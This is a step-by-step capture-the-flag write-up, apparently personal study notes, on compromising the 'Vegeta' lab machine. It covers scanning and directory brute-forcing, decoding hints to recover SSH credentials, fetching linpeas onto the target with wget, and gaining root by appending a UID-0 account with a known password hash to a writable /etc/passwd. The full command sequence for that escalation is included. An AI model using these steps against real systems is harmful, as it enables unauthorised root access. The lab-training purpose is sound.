@@ -1,0 +1,380 @@
+VEGETA
+
+#   FIND IP USING 
+ 
+ ┌──(root㉿kali)-[/home/bla]
+└─# arp-scan -l
+
+ 192.168.0.22 
+ 
+ # NMAP 
+ 
+┌──(㉿kali)-[~]
+└─$ nmap 192.168.0.22 -sC -sV  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 10:14 IST
+Nmap scan report for 192.168.0.22
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 1f:31:30:67:3f:08:30:2e:6d:ae:e3:20:9e:bd:6b:ba (RSA)
+|   256 7d:88:55:a8:6f:56:c8:05:a4:73:82:dc:d8:db:47:59 (ECDSA)
+|_  256 cc:de:de:4e:84:a8:91:f5:1a:d6:d2:a6:2e:9e:1c:e0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:BA:22:AB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+
+
+   ┌──(㉿kali)-[~]
+└─$ nmap 192.168.0.22 -sC -sV --script=vuln
+
+_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-enum: 
+|   /admin/: Possible admin folder
+|   /admin/admin.php: Possible admin folder
+|   /login.php: Possible admin folder
+|   /robots.txt: Robots file
+|   /image/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
+|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
+|_  /manual/: Potentially interesting folder
+MAC Address: 08:00:27:BA:22:AB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+#GOT HTTP PORT IS OPEN SO 
+
+ there is text & image 
+ 
+ apply common web ideas :-
+ 
+                         ctl + A for select hidden text 
+                         zoom in /out = maybe some thing hide doen
+                         inspect source code
+                          robot.txt
+                          
+#ROBOT.TXT 
+
+robot.txt > view-source:http://192.168.0.22/find_me/find_me.html 
+
+AT THERE WE GOT ONE ENCYPTED TEXT IN COMMAND SECTON AT I INSPECTING TIME
+ 
+ *last end == or = assume it base hash
+
+#DECODING THE TEXT USING CYBERCIEF
+
+DONE 2 TIMES MAGIC I GOT 
+
+Password : topshellv
+
+So we have one pass find where it apply
+
+
+# GOBUSTER 
+
+┌──(㉿kali)-[~]
+└─$ gobuster dir -u http://192.168.0.22  -w /usr/share/wordlists/dirb/common.txt / -x txt,html,php -t 40 --no-error
+
+
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.0.22
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/admin                (Status: 301) [Size: 312] [--> http://192.168.0.22/admin/]
+/image                (Status: 301) [Size: 312] [--> http://192.168.0.22/image/]
+/img                  (Status: 301) [Size: 310] [--> http://192.168.0.22/img/]
+/index.html           (Status: 200) [Size: 119]
+/manual               (Status: 301) [Size: 313] [--> http://192.168.0.22/manual/]
+/robots.txt           (Status: 200) [Size: 11]
+/server-status        (Status: 403) [Size: 277]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+         
+         NOTHING GOT 
+         
+         TRY BIG FILE
+         
+         
+┌──(falco㉿kali)-[~]
+└─$ gobuster dir -u http://192.168.0.22  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x txt,html,php -t 40 --no-error 
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.0.22
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              txt,html,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 119]
+/img                  (Status: 301) [Size: 310] [--> http://192.168.0.22/img/]
+/login.php            (Status: 200) [Size: 0]
+/image                (Status: 301) [Size: 312] [--> http://192.168.0.22/image/]
+/admin                (Status: 301) [Size: 312] [--> http://192.168.0.22/admin/]
+/manual               (Status: 301) [Size: 313] [--> http://192.168.0.22/manual/]
+/robots.txt           (Status: 200) [Size: 11]
+/server-status        (Status: 403) [Size: 277]
+Progress: 882232 / 882232 (100.00%)
+===============================================================
+Finished
+=============================================================
+
+
+   NOTHING SPECIAL
+   
+  so
+  
+ #NIKTO  
+ Nikto is an open-source command-line tool used to scan web servers for vulnerabilities
+. Its purpose is to automate the process of identifying security weaknesses by checking for dangerous files and programs, outdated software versions, and server configuration errors. It helps users find security gaps, making it a valuable tool for penetration testing and web server security maintenance. 
+ 
+ 
+ 
+ 
+ ┌──(falco㉿kali)-[~]
+└─$ nikto -url http://192.168.0.22/
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.22
++ Target Hostname:    192.168.0.22
++ Target Port:        80
++ Start Time:         2025-11-25 11:00:31 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Server may leak inodes via ETags, header found with file /, inode: 77, size: 5a9262e9632c0, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
++ /admin/: Directory indexing found.
++ /admin/: This might be interesting.
++ /img/: Directory indexing found.
++ /img/: This might be interesting.
++ /manual/: Web server manual found.
++ /manual/images/: Directory indexing found.
++ /image/: Directory indexing found.
++ /admin/admin.php?adminpy=1: PY-Membres 4.2 may allow administrator access. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1198
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ /login.php: Admin login page/section found.
++ 8103 requests: 0 error(s) and 15 item(s) reported on remote host
++ End Time:           2025-11-25 11:01:12 (GMT5.5) (41 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                   
+                   NOTHING SPECIAL GOT STUCKED 
+                   
+                   WHT NEXT 
+                   
+                   200000hrs LATER(sarcasm)
+                  
+                  
+#FIRST WE GOT A SOMETHING LIKE Password : topshellv ACTUALLY THIS IS NOT A PASSWORD IT IS A HINT SO FIND 
+
+find what is topshellv 
+
+hint to b374k:php 
+
+TRY http://192.168.0.22/b374k.php
+
+APPLY COMMON WEB IDEAS 
+
+then we got /bulma  FROM SORCE CODE
+
+#                http://192.168.0.22/bulma/
+
+ GOT A AUDIO CLIP 
+ 
+ I JUST CONVERTED AUDIO TO TEXT USING morsecode.world 
+ 
+ THE TEXT I GOT IS
+ 
+USER : TRUNKS PASSWORD : US3R(S IN DOLLARS SYMBOL)
+
+NOW WE HAVE USER & PASS 
+
+TRY SSH 
+
+┌──(falco㉿kali)-[~]
+└─$ ssh trunks@192.168.0.22 
+  
+  GOT ACCESS
+  trunks@Vegeta:~$ whoami
+  trunks
+  
+ #WE NEED TO RUN LINPEAS SO IMPORT LINPEAS FROM OUR SYSTEM TO trunks@Vegeta
+  
+  
+  so  open new terminal 
+  
+  RUN python server on our device 
+  
+  ┌──(㉿kali)-[~]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+so server running 
+
+search on browser http://systemip:8000/
+
+copylink of linpeas.sh (u want install linpeas and move to /home/user )
+
+come to trunks@Vegeta:~$ terminal 
+get inside tmp 
+then 
+download copied link of linpeas 
+
+trunks@Vegeta:/tmp$ wget http://192.168.29.162:8000/linpeas.sh
+
+--2025-11-26 10:08:17--  http://192.168.29.162:8000/linpeas.sh
+Connecting to 192.168.29.162:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 971926 (949K) [application/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                                  100%[=========================================================================================================================================>] 949.15K  --.-KB/s    in 0.06s   
+
+2025-11-26 10:08:17 (16.8 MB/s) - ‘linpeas.sh’ saved [971926/971926]
+
+change permission to run linpeas
+
+trunks@Vegeta:/tmp$ ls
+linpeas.sh  systemd-private-30b848ad6a774462a384b0624aed585c-apache2.service-3Ngq4P  systemd-private-30b848ad6a774462a384b0624aed585c-systemd-timesyncd.service-ethJnw
+
+trunks@Vegeta:/tmp$ ls -l linpeas.sh 
+-rw-r--r-- 1 trunks trunks 971926 Nov  7 10:09 linpeas.sh
+
+trunks@Vegeta:/tmp$ chmod +x linpeas.sh
+
+trunks@Vegeta:/tmp$ ls -l linpeas.sh 
+-rwxr-xr-x 1 trunks trunks 971926 Nov  7 10:09 linpeas.sh
+
+
+
+#   RUN LINPEAS.SH
+
+trunks@Vegeta:/tmp$ ./linpeas.sh
+
+we got 
+
+ Writable passwd file? ................ /etc/passwd is writable
+ 
+ so  
+ 
+ # WE CAN EDIT  /etc/passwd . passwd shows users,privilege useres things
+ 
+#trunks@Vegeta:/etc$ cat passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+
+
+
+
+#trunks@Vegeta:/etc$ grep "/home" /etc/passwd
+ trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash
+ 
+
+#trunks@Vegeta:/etc$ grep "/root" /etc/passwd    (USING GREP FOR FIND WORD IN BIG FILE)
+ root:x:0:0:root:/root:/bin/bash
+
+
+#       HERE WE CAN EDIT ROOT PASS USING NANO OR CREATE A NEW USER EITH SAME PREVILEGE OF ROOT USING ECHO AM GO WITHH ECHO
+
+# trunks@Vegeta:/etc$ openssl passwd raj  (user pass is raj) (refered from https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
+ k4rDBOI9FNpa6                            (automatic create a hash of raj to understand kali like autthinication )
+
+# trunks@Vegeta:/etc$ echo "mark:k4rDBOI9FNpa6:0:0:root:/root:/bin/bash" >> /etc/passwd       (creating a new user with same privilege of ROOT like mirror of root )
+
+# trunks@Vegeta:/etc$ cat passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mark:k4rDBOI9FNpa6:0:0:root:/root:/bin/bash                                       (i created user but root power)
+
+
+#trunks@Vegeta:~$ su -l mark   (-l for get direct user home)
+Password:           (pass i entered is raj)
+
+root@Vegeta:~#        (got root acces)
+
+#root@Vegeta:~# ls
+root.txt
+
+root@Vegeta:~# cat root.txt
+               GOT LAST FLAG
+
+
+WHAT NEW : IF WE GOT VULNERBILITY RELATED TO /bin  WE USE GTFObin COMMANDS 
+           HERE WE GOT /etc/passwd SO WE USE this method
+
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||COMPLETED||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
